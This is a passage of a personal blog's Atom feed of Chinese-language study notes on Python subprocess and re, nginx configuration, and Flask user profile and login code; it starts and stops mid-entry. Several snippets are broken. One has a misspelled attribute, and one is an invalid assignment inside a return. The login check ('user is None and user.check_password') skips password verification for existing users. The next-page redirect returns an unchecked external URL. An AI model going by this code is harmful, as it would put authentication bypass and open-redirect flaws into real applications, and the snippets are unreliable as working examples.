bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0, restore_signals=True, start_new_session=False, pass_fds=(), *, encoding=None, errors=None)</span><br></pre></td></tr></table></figure><h2 id="常见代码1"><a class="markdownIt-Anchor" href="#常见代码1"></a> 常见代码1：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test = subprocess.Popen([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)</span><br><span class="line"># test.stdout 返回一个&lt;_io.BufferedReader name=3&gt;</span><br><span class="line">test.stdiyt.read()   # 读取输出</span><br><span class="line"></span><br><span class="line">注： 必须要有 stdout=subprocess.PIPE 否则不会有输出。</span><br></pre></td></tr></table></figure><h1 id="与命令交互"><a class="markdownIt-Anchor" href="#与命令交互"></a> 与命令交互：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Popen.communicate(input=None,timeout=None) # (stdout_data,stderr_data)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;subprocess 允许你启动一个新的进程，连接到这个进程的输入，输出，错误的管道中，取得返回的值。用于执行一些系统
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="modules" scheme="http://yoursite.com/categories/python/modules/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python模块 - re</title>
    <link href="http://yoursite.com/2018/06/13/python%E6%A8%A1%E5%9D%97-re/"/>
    <id>http://yoursite.com/2018/06/13/python模块-re/</id>
    <published>2018-06-13T00:30:57.000Z</published>
    <updated>2018-06-18T16:19:08.558Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>正则表达式是处理字符串的强大的工具，检索字符串，替换，匹配验证等等。</p></blockquote><h1 id="常用的匹配规则"><a class="markdownIt-Anchor" href="#常用的匹配规则"></a> 常用的匹配规则</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">\w 匹配字母，数字和下划线</span><br><span class="line">\d 匹配数字</span><br><span class="line">\s 匹配任何空白字符</span><br><span class="line">\z 匹配字符串结尾，如果有换行符，一起匹配</span><br><span class="line">\n 匹配换行</span><br><span class="line">\t 匹配制表符</span><br><span class="line">^  匹配开头</span><br><span class="line">$  匹配结尾</span><br><span class="line">.  匹配任何字符，除了换行符，除非指定re.DOTALL</span><br></pre></td></tr></table></figure><h1 id="python的re模块"><a class="markdownIt-Anchor" href="#python的re模块"></a> python的re模块</h1><blockquote><p>注： .*? 遇到换行符就不管用了，除非加上re.S</p></blockquote><h2 id="match"><a class="markdownIt-Anchor" href="#match"></a> match</h2><blockquote><p>match 尝试从字符串开头开始匹配正则表达式，如果成功就返回，如果没有就返回一二None</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; a = &quot;Hello World&quot;</span><br><span class="line">&gt;&gt;&gt; b = re.match(&apos;\w+\s&apos;,a,re.S)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 6), match=&apos;Hello &apos;&gt;</span><br><span class="line">&gt;&gt;&gt; b.span()</span><br><span class="line">(0, 6)</span><br><span class="line">&gt;&gt;&gt; b.group()</span><br><span class="line">&apos;Hello &apos;</span><br><span class="line">&gt;&gt;&gt; b.group(0)</span><br><span class="line">&apos;Hello &apos;</span><br><span class="line"></span><br><span class="line">None 是false</span><br></pre></td></tr></table></figure><h2 id="search"><a class="markdownIt-Anchor" href="#search"></a> search</h2><blockquote><p>扫描整个字符串，如果符合就返回，否则返回none</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; a = &quot;Hello World&quot;</span><br><span class="line">&gt;&gt;&gt; c = re.search(&apos;\s\w+&apos;,a)</span><br><span class="line">&gt;&gt;&gt; c</span><br><span class="line">&lt;_sre.SRE_Match object; span=(5, 11), match=&apos; World&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; c.group()</span><br><span class="line">&apos; World&apos;</span><br></pre></td></tr></table></figure><h1 id="findall"><a class="markdownIt-Anchor" href="#findall"></a> findall</h1><blockquote><p>当需要提取全部匹配的内容，需要使用findall，使用search只能取回第一个。如果在匹配的时候用括号指定了，那么返回中的列表就会包含元祖</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = re.findall(r&apos;He(l)l(o)&apos;,a)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">[(&apos;l&apos;, &apos;o&apos;)]</span><br></pre></td></tr></table></figure><h1 id="sub"><a class="markdownIt-Anchor" href="#sub"></a> sub</h1><blockquote><p>替换文本,返回替换好的字符串</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.sub(&apos;\s\w+&apos;,&apos;johnw&apos;,a)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;正则表达式是处理字符串的强大的工具，检索字符串，替换，匹配验证等等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="modules" scheme="http://yoursite.com/categories/python/modules/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux - Nginx</title>
    <link href="http://yoursite.com/2018/06/09/Linux-Nginx/"/>
    <id>http://yoursite.com/2018/06/09/Linux-Nginx/</id>
    <published>2018-06-09T13:22:07.000Z</published>
    <updated>2018-06-14T15:27:09.267Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nginx做为静态服务器和反向代理服务器"><a class="markdownIt-Anchor" href="#nginx做为静态服务器和反向代理服务器"></a> nginx做为静态服务器和反向代理服务器</h1><h2 id="安装nginx"><a class="markdownIt-Anchor" href="#安装nginx"></a> 安装nginx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 查看nginx版本,内核需要2.6以上</span><br><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">#安装gcc</span><br><span class="line">yum install gcc gcc-c++ pcre-devel zlib zlib-devel openssl openssl-devel</span><br><span class="line"></span><br><span class="line">gcc 编译c</span><br><span class="line">gcc-c++ 编译c++</span><br><span class="line">pcre-devel 解析perl正则</span><br><span class="line">zlib 用于压缩</span><br><span class="line">zlib-devel 用于开发</span><br><span class="line">openssl 用于ssl加密</span><br><span class="line"></span><br><span class="line">#安装nginx</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">#configure配置选项</span><br><span class="line">--prefix=PATH 安装部署后的根目录</span><br><span class="line">--sbin-path 可执行文件的放置路径 基于前面的prefix  &lt;prefix&gt;/sbin/nginx</span><br><span class="line">--conf-path 放置配置文件  &lt;prefix&gt;/conf/nginx.conf</span><br><span class="line">--error-log-path &lt;prefix&gt;/logs/errors.log</span><br></pre></td></tr></table></figure><h2 id="启动nginx"><a class="markdownIt-Anchor" href="#启动nginx"></a> 启动nginx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./usr/local/sbin/nginx -s stop / reload</span><br><span class="line">                       -c xxx.conf</span><br></pre></td></tr></table></figure><h2 id="将nginx做为静态服务器"><a class="markdownIt-Anchor" href="#将nginx做为静态服务器"></a> 将nginx做为静态服务器</h2><h4 id="case"><a class="markdownIt-Anchor" href="#case"></a> case:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  location ^~ /static&#123;</span><br><span class="line">    alias usr/local/nginx/conf</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="明确root和alias的不同"><a class="markdownIt-Anchor" href="#明确root和alias的不同"></a> 明确root和alias的不同</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># root</span><br><span class="line">location conf &#123;</span><br><span class="line">  root usr/local/nginx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># alias</span><br><span class="line">location conf &#123;</span><br><span class="line">  alias usr/local/nginx/conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alias 要指定到具体的一层文件夹</span><br><span class="line">root  会根据url来映射文件夹</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">http://www.xxx.com/conf/test.html </span><br><span class="line">alias的处理 匹配location为conf的规则，将配置的文件夹直接返回给用户</span><br><span class="line">root的处理：匹配到location为conf的规则，提取/conf/test.html 拼接到已配置的文件夹下面</span><br></pre></td></tr></table></figure><h2 id="将nginx做为反向代理服务器"><a class="markdownIt-Anchor" href="#将nginx做为反向代理服务器"></a> 将nginx做为反向代理服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 在nginx.conf里面的http模块里面加入</span><br><span class="line">include &apos;/usr/local/nginx/conf/nginx2.conf&apos;</span><br><span class="line">vim nginx2.conf</span><br><span class="line"></span><br><span class="line">upstream xxx&#123;</span><br><span class="line">  server 112.11.11.11:8080;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">  server_name www.xxx.com;</span><br><span class="line">  location / &#123;</span><br><span class="line">    proxy_pass http://xxx;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="如何做好负载均衡"><a class="markdownIt-Anchor" href="#如何做好负载均衡"></a> 如何做好负载均衡？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upstream xxx&#123;</span><br><span class="line">  server 111.111.111.111 weight=5(权重，优先转发);</span><br><span class="line">  server 222.222.222.222 max_fails=3 fail_timeout=30s(失败3次，30s);</span><br><span class="line">  server 333.333.333.333 down(下线);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image.png" alt="nginx"><br><img src="/images/image2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;nginx做为静态服务器和反向代理服务器&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#nginx做为静态服务器和反向代理服务器&quot;&gt;&lt;/a&gt; nginx做为静态服务器和反向代理服务器&lt;/h1&gt;
&lt;h2 id=&quot;安装nginx&quot;&gt;&lt;a c
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
      <category term="Nginx" scheme="http://yoursite.com/categories/Linux/Nginx/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask06 - User Profile</title>
    <link href="http://yoursite.com/2018/06/09/Flask06-User-Profile/"/>
    <id>http://yoursite.com/2018/06/09/Flask06-User-Profile/</id>
    <published>2018-06-09T13:21:27.000Z</published>
    <updated>2018-06-18T16:19:58.837Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>如何用flask实现用户个人中心和头像</p></blockquote><h1 id="个人中心"><a class="markdownIt-Anchor" href="#个人中心"></a> 个人中心</h1><ol><li>使用名字做为url的一部分来分辨个人中心。注意点（url_for, first_or_404）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/user/&lt;username&gt;&apos;)</span><br><span class="line">def user():</span><br><span class="line">    user = User.query.filter_by(username=username).first_or_404()</span><br><span class="line">    posts = [</span><br><span class="line">        &#123;&apos;author&apos;:user,&apos;body&apos;:&apos;Test Post #1&apos;&#125;,</span><br><span class="line">        &#123;&apos;author&apos;:user,&apos;body&apos;:&apos;Test Post #2&apos;&#125;,</span><br><span class="line">    ]</span><br><span class="line">    return render_template(&apos;user.html&apos;,user=user,posts=posts)</span><br><span class="line">    </span><br><span class="line">#使用&lt;username&gt;做为url的变量来区别用户。还有其他几种方式</span><br><span class="line">&lt;string:username&gt;</span><br><span class="line">&lt;int:user_id&gt;</span><br><span class="line">&lt;any(a,b):page_name&gt; 不是 a 就是 b</span><br><span class="line"></span><br><span class="line">* 注意： 当使用url_for 引用这个地址的时候，要把参数加进去</span><br><span class="line">url_for(&apos;user&apos;,username=username)</span><br></pre></td></tr></table></figure><ol start="2"><li>如何生成头像，并展示和应用于每个用户</li></ol><blockquote><p>通过请求 <a href="https://www.gravatar.com/avatar/" target="_blank" rel="noopener">https://www.gravatar.com/avatar/</a><hash> 就可以请求到一张图片，其中这个hash可以是email或者任意值</hash></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class User(UserMixin,db.Model):</span><br><span class="line">    ...</span><br><span class="line">    def set_avatars(self,size):</span><br><span class="line">        url = &quot;https://www.gravatar.com/avatar/&#123;&#125;?d=identicon&amp;s=&#123;&#125;&quot;.format(md5(self.username.lower().encode(&apos;utf-8&apos;)).hexdigest(),size)</span><br><span class="line">        return url</span><br><span class="line">        </span><br><span class="line"># 在HTML模板里面展示</span><br><span class="line">&lt;img src=&apos;&#123;&#123; current_user.set_avatars(128)&#125;&#125;&apos;&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>对于重复的部分，使用jinja2的子模板</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 对于发表文章这一部分，可能其他的地方也会用到，比如首页。因此我们将这部分独立出来</span><br><span class="line"></span><br><span class="line">_posts.html</span><br><span class="line"></span><br><span class="line"># 使用include，可以实现把子模板包含进来</span><br><span class="line">&#123;% include &quot;_posts.html&quot; %&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>增加两个值，一个最后登录的时间，一个是个性签名</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class User(UserMixin,db.Model):</span><br><span class="line">    ...</span><br><span class="line">    # 增加两个字段</span><br><span class="line">    last_seen = db.Column(db.DateTime,default=datetime.now)</span><br><span class="line">    about_me = db.Column(db.String(140))</span><br><span class="line"></span><br><span class="line"># 如何使用last_seen这个参数？</span><br><span class="line">我们每次用户发送请求过来的时候，我们都去更新这个值</span><br><span class="line"></span><br><span class="line"># 在每个请求之前，需要执行的操作。</span><br><span class="line"># 为什么不用db.session.add ， 是因为  current_user 是flask-login从db里面query出来的。本来就已经在db.session里面了。 </span><br><span class="line">@app.before_request</span><br><span class="line">def before_request():</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        current_user.last_seen = datetime.now()</span><br><span class="line">        db.session.commit()</span><br></pre></td></tr></table></figure><ol start="5"><li>edit user profile</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/edit_profile&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">@login_required</span><br><span class="line">def edit_profile():</span><br><span class="line">    form = EditProfileForm()</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        current_user.username = form.username.data</span><br><span class="line">        current_user.about_me = form.about_me.data</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&apos;Your change have saved.&apos;)</span><br><span class="line">        return redirect(url_for(&apos;user&apos;,username=current_user.username))</span><br><span class="line">    </span><br><span class="line">    form.username.data = current_user.username</span><br><span class="line">    form.about_me.data = current_user.about_me</span><br><span class="line">    return render_template(&apos;profile.html&apos;,form=form)</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><blockquote><p>主要遇到的问题，就是flask-migrate 的时候，如果你已经downgrade一次了，一定要把version下面的版本文件给删除，否则会出现版本不是最新的状况。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;如何用flask实现用户个人中心和头像&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;个人中心&quot;&gt;&lt;a clas
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Flask05 - User login</title>
    <link href="http://yoursite.com/2018/06/09/Flask05-User-login/"/>
    <id>http://yoursite.com/2018/06/09/Flask05-User-login/</id>
    <published>2018-06-09T13:20:49.000Z</published>
    <updated>2018-06-18T16:20:02.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>使用flask 实现登录的功能</p></blockquote><h1 id="用户登录"><a class="markdownIt-Anchor" href="#用户登录"></a> 用户登录</h1><ol><li>用户密码安全</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 用户密码的安全我们使用werkzeug.sercurity来做,增加两个函数</span><br><span class="line">class User(db.Model):</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    def set_password_hash(self,password):</span><br><span class="line">        return self.password_hash = generate_password_hash(password)</span><br><span class="line">    </span><br><span class="line">    def check_password_hash(self,password):</span><br><span class="line">        return check_password_hash(self.password_hash,password)</span><br><span class="line">        </span><br><span class="line"># 用户的密码安全存储</span><br><span class="line">a. 用户密码原始值 + 随机字符</span><br><span class="line">b. hash256</span><br><span class="line">c. hash值 + 随机字符</span><br><span class="line">d. 存入数据库</span><br><span class="line"></span><br><span class="line"># 校验用户密码安全</span><br><span class="line">a. 取出hash值,截取随机字符</span><br><span class="line">b. 接受用户输入的密码 + 截取的随机字符</span><br><span class="line">c. 使用相同的hash函数进行hash</span><br><span class="line">d. 将得到的hash值与数据库的hash值进行比较</span><br></pre></td></tr></table></figure><ol start="2"><li>安装flask-login</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-login</span><br></pre></td></tr></table></figure><ol start="3"><li>flask-login 介绍</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># flask-login 是flask的插件，用于登录用户，管理用户session，登出用户等等。</span><br><span class="line"></span><br><span class="line"># 一共有四种属性</span><br><span class="line">is_authenticated： 如果用户已经认证了</span><br><span class="line">is_active： 如果用户是已经激活的状态，也可以认为是认证了</span><br><span class="line">is_anonymous： 未登录的状态</span><br><span class="line">get_id()：将用户id做为一个字符返回</span><br><span class="line"></span><br><span class="line"># 使用步骤</span><br><span class="line">a. 在app/__init__.py 中初始化flask-login 并且指定哪个view 函数来做为登录处理函数</span><br><span class="line"></span><br><span class="line">##### 引入登录管理函数</span><br><span class="line">login_manager = LoginManager(app)</span><br><span class="line">login_manager.session_protection = &quot;strong&quot;</span><br><span class="line">##### 如果登录函数是在蓝图中的话，可以使用例如 main.login 这样的方式</span><br><span class="line">login_manager.login_view = &apos;login&apos;</span><br><span class="line"></span><br><span class="line">b. 在 models.py 里面指定哪个为用户的数据库表对象，然后通过user_id 来管理和追踪用户的session</span><br><span class="line"></span><br><span class="line">from flask_login import UserMixin</span><br><span class="line">class User(UserMixin,db.Model):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">c. 通过user id来管理会话</span><br><span class="line">@login_manager.user_loader</span><br><span class="line">def load_user(id):</span><br><span class="line">    #### 经过flask-login处理 id 已经是字符了，所以要加int，类型转换</span><br><span class="line">    return User.query.get(int(id))</span><br><span class="line"></span><br><span class="line">d. 通过login_user 来登录用户</span><br><span class="line">e. 通过logout_user 来注销用户</span><br><span class="line">f. 通过 @login_required 包装函数来保护登录的链接</span><br></pre></td></tr></table></figure><ol start="4"><li>用户登录逻辑</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 结合上面陈述，代码如下</span><br><span class="line">@app.route(&apos;/login&apos;,methods=[&apos;GET&apos;,&quot;POST&quot;])</span><br><span class="line">def login():</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    # 处理表单验证的逻辑</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        # 存储提示信息，可以使用get_flashed_messages 来获取</span><br><span class="line">        # flash(&apos;Login Request from user: &#123;&#125; and remember me: &#123;&#125;&apos;.format(form.username.data,form.remember_me.data))</span><br><span class="line">        user = User.query.filter_by(username=form.username.data).first()</span><br><span class="line">        if user is None and user.check_password(form.password.data):</span><br><span class="line">            flash(&quot;Your password or username was wrong.&quot;)</span><br><span class="line">            return redirect(url_for(&apos;login&apos;))</span><br><span class="line">        </span><br><span class="line">        login_user(user,form.remember_me.data)</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    </span><br><span class="line">    return render_template(&apos;login.html&apos;,form=form,title=&apos;login&apos;)</span><br></pre></td></tr></table></figure><ol start="5"><li>如何显示登录错误的信息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">可以再script里面显示</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    &#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">        &#123;% if messages %&#125;</span><br><span class="line">           &#123;% for message in messages %&#125;</span><br><span class="line">               alert(&quot;&#123;&#123; message &#125;&#125;&quot;)</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        &#123;% endif %&#125;        </span><br><span class="line">    &#123;% endwith %&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li>访问受保护的链接重定向网址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 在flask中，如果你访问受保护的链接的时候，会重定向到登录的网址，后面加上?next_page=xxxx 从哪里来的</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">http://127.0.0.1:5000/login?next=%2Fprofile </span><br><span class="line"></span><br><span class="line">返回默认的flash信息：</span><br><span class="line">&quot;please login to access this page&quot;</span><br><span class="line"></span><br><span class="line"># 不是很好，待改正</span><br><span class="line">next_page = request.args.get(&apos;next&apos;)</span><br><span class="line">if not next_page or url_parse(next_page).netloc != &apos;&apos;:</span><br><span class="line">    next = url_for(index)</span><br><span class="line">return redirect(next_page)</span><br></pre></td></tr></table></figure><ol start="7"><li>注册</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/register&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def register():</span><br><span class="line">    form = 